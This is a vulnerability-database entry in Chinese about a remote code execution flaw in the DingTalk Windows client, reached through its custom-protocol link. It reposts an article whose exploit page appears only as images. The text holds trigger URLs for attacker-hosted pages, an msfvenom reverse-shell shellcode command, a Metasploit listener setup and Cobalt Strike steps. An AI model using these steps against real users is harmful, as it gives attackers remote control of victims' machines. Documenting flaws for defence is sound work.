---
source: "MrWQ/vulnerability-paper"
title: "钉钉Windows客户端 自定义协议载入页面到客户端远程代码执行"
product: "钉钉Windows客户端"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "声称<6.3.25-Release.2149108，Windows x86"
prerequisites: "需用户/系统打开dingtalk协议链接"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/y1ycubUpoxd_gZSot7xQ0Q"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E4%B9%8B%E9%92%89%E9%92%89/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E4%B9%8B%E9%92%89%E9%92%89%20RCE.md"
id: "vw-46131f21aa3c3c7ed472b0e7"
entity_id: "ve-46131f21aa3c3c7ed472b0e7"
schema_version: "1"
---

# 钉钉Windows客户端 自定义协议载入页面到客户端远程代码执行

## 条目说明

- 对象与具体问题：钉钉Windows客户端；自定义协议载入页面到客户端RCE
- 版本、配置及部署条件：声称<6.3.25-Release.2149108，Windows x86
- 认证与权限前提：需用户/系统打开dingtalk协议链接
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 网页POC主体和证明均为未视检图片，文本只含触发协议及shellcode替换说明，缺根因与完整代码
- 客户端漏洞应与Web服务端RCE分类区分，不能省略用户交互条件
- MSF handler片段缺payload匹配说明；calc触发URL少http与后文不一致
- 反连教程和感悟占比高，保留来源版权说明；修复版本仅边界推断无公告

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/y1ycubUpoxd_gZSot7xQ0Q)

我这一生如履薄冰，你说我能走到对岸吗？

本文首发于 SecIN 社区，原创作者即是本人

前言
==

网络安全技术学习，承认⾃⼰的弱点不是丑事。只有对原理了然于⼼，才能突破更多的限制。拥有快速学习能力的白帽子，是不能有短板的，有的只能是大量的标准板和几块长板。知识⾯，决定看到的攻击⾯有多⼴；知识链，决定发动的杀伤链有多深。

一、影响版本：
=======

经测试需要钉钉版本 < 6.3.25-Release.2149108

二、poc：
======

![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMzfcibxOmHzibLFbMpibp34nd2a0TZJqicvAqxh0H1PYkapANia7Bxrcial6w/640?wx_fmt=jpeg&from=appmsg)

三、触发方式
======

```
dingtalk://dingtalkclient/page/link?url=x.x.x.x/calc.html&pc_slide=true

```

#### 漏洞证明：

![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMvBupvTOsrLUFDzIThyDeEyJNUlKYChzVEzciaO6BVO0TzOedA2K9ibRQ/640?wx_fmt=jpeg&from=appmsg)

四、msf 反弹 shell
==============

msf 生成 shellcode
----------------

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxx -e x86/shikata_ga_nai -f csharp

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMVgQrAXU2tic5iblKguyFAtFRf617wujeM2SLBJNDeibGS1IwBDIFFY5tQ/640?wx_fmt=jpeg&from=appmsg)

msf 开启监听
--------

```
use exploits/multi/handler
set lhost x.x.x.x
set lport xxx
run

```

将生成的 shellcode 替换原 shellcode
----------------------------

![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMlB5ySCUPhia9TnjW8Tj7siaibgltktQCarAl14wFZBRAibRyy9oYogM9wA/640?wx_fmt=jpeg&from=appmsg)

需要替换的位置为
--------

```
var shellcode=new Uint8Array()

```

poc:
----

```
dingtalk://dingtalkclient/page/link?url=http://x.x.x.x/msf.html&pc_slide=true

```

漏洞证明
----

![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMvGnsGvQOLeAlEzqOSmibFmzIrpOntk1TGdvrKrV8u3NVe1qGvtCAbUQ/640?wx_fmt=jpeg&from=appmsg)

五、cs 反弹 shell
=============

cs 生成 c# 的 shellcode
--------------------

![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mM2S9OWu1EQJbhQ0IJ3ZY5HAKVIrmN3c9s8jt94Cgqj3Dj06QH75peYQ/640?wx_fmt=jpeg&from=appmsg)

不要勾选 x64

![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMuqSefJ3FEWLaK3W2MjbVRC4xTqjVwicAYTHtENgOoDiafQlRmkbaNpCQ/640?wx_fmt=jpeg&from=appmsg)

将生成的 shellcode 替换原 shellcode

![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMT1spsXCxqoYv8zzjYibysjm3icRcSCkKicYe0rf8awVcGtUfVcDCj8Ryg/640?wx_fmt=jpeg&from=appmsg)

需要替换的位置为
--------

```
var shellcode=new Uint8Array()

```

poc:
----

```
dingtalk://dingtalkclient/page/link?url=http://x.x.x.x/cs.html&pc_slide=true

```

成功上线 cs
-------

![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMwS2vzI2dK4qZYCiaW1IO128dI5s6aJV6AoPkLTWrBEMH8xj4ribMpI6w/640?wx_fmt=jpeg&from=appmsg)

网络安全感悟
======

做网络安全是一个长期的过程，因为做网络安全没有终点，不管是网络安全企业，还是在网络安全行业各种不同方向的从业人员，不管你选择哪个方向，只有在这条路上坚持不懈，才能在这条路上走的更远，走的更好，不然你肯定走不远，迟早会转行或者被淘汰，把时间全浪费掉。如果你觉得自己是真的热爱网络安全这个行业，坚持走下去就可以了，不用去管别人，现在就是一个大浪淘金的时代，淘下去的是沙子，留下来的才是金子，正所谓，千淘万漉虽辛苦，吹尽狂沙始到金，网络安全的路还很长，一生只做一件事，坚持做好一件事！

**免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。**

**转载声明：各家兴 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。**

```
CSDN:
https://blog.csdn.net/weixin_48899364?type=blog

公众号：
https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTU2NjA1Mw==&action=getalbum&album_id=1696286248027357190&scene=173&from_msgid=2247485408&from_itemidx=1&count=3&nolastread=1#wechat_redirect

博客:
https://rdyx0.github.io/

先知社区：
https://xz.aliyun.com/u/37846

SecIN:
https://www.sec-in.com/author/3097

FreeBuf：
https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85



```

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
